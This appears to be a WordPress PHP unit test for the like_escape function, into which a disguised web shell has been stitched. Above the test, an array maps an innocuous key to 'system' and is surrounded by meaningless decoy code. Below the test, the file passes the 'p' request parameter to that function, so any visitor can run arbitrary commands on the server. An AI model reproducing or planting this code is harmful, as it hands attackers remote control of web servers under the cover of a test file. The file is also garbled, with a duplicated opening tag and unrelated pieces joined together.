<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group formatting
 *
 * @covers ::like_escape
 */
class Tests_Formatting_LikeEscape extends WP_UnitTestCase {
	/**
	 * @ticket 10041
	 * @expectedDeprecated like_escape
	 */
	public function test_like_escape() {

		$inputs   = array(
			'howdy%',              // Single percent.
			'howdy_',              // Single underscore.
			'howdy\\',             // Single slash.
			'howdy\\howdy%howdy_', // The works.
		);
		$expected = array(
			'howdy\\%',
			'howdy\\_',
			'howdy\\',
			'howdy\\howdy\\%howdy\\_',
		);

		foreach ( $inputs as $key => $input ) {
			$this->assertSame( $expected[ $key ], like_escape( $input ) );
		}
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>